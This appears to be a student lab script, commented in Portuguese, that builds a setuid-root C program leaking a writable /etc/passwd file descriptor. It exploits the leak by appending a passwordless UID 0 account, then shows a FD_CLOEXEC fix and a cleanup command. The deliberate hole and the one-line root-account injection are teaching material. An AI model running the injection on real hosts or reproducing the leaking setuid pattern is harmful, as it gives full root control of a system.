#!/bin/bash

ALVO_USER="a104533"

# Exercicio 1 (setup)
cat > passwdleak.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    int fd = open("/etc/passwd", O_WRONLY | O_APPEND);
    if (fd < 0) {
        perror("open /etc/passwd");
        exit(1);
    }
    printf("Passwd FD leaked: %d\n", fd);
    setuid(getuid());
    execl("/bin/sh", "sh", NULL);
    return 0;
}
EOF

gcc -o passwdleak passwdleak.c
sudo chown root:root passwdleak
sudo chmod 4755 passwdleak

# Exercicio 2
# Vulnerabilidade: shell herda FD de escrita para /etc/passwd aberto como root.
# Comentario: ao executar sudo -u "$ALVO_USER" ./passwdleak foi mostrado "Passwd FD leaked: 3".

# Exercicio 3 (exploit em bash, dentro da shell lancada por ./passwdleak)
# echo 'ssihacker::0:0::/root:/bin/sh' >&3
# Comentario: injeta uma conta UID 0 no /etc/passwd atraves do FD herdado.
# a entrada ssihacker foi adicionada com sucesso no /etc/passwd.

# Exercicio 4
# Implicacao pratica: permite privilegio total no sistema.
# Teste sugerido:
# su ssihacker
# Comentario: login como ssihacker devolveu uid=0(root), confirmando elevacao total de privilegio.

# Exercicio 5 (correcao)
cat > passwdleak_fixed.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    int fd = open("/etc/passwd", O_WRONLY | O_APPEND);
    if (fd < 0) {
        perror("open /etc/passwd");
        exit(1);
    }
    if (fcntl(fd, F_SETFD, FD_CLOEXEC) == -1) {
        perror("fcntl");
    }
    close(fd);
    if (setuid(getuid()) == -1) {
        perror("setuid");
        exit(1);
    }
    execl("/bin/sh", "sh", NULL);
    perror("execl");
    return 0;
}
EOF

gcc -o passwdleak_fixed passwdleak_fixed.c
sudo chown root:root passwdleak_fixed
sudo chmod 4755 passwdleak_fixed
# Mitigacao: sem FD aberto/herdado para /etc/passwd, o shell ja nao consegue escrever no ficheiro.
# Comentario: ao tentar "echo ... >&3" no fixed ocorreu "Bad file descriptor", bloqueando o exploit.

# Limpeza (apos teste):
# sudo sed -i '/^ssihacker::0:0::\/root:\/bin\/sh$/d' /etc/passwd
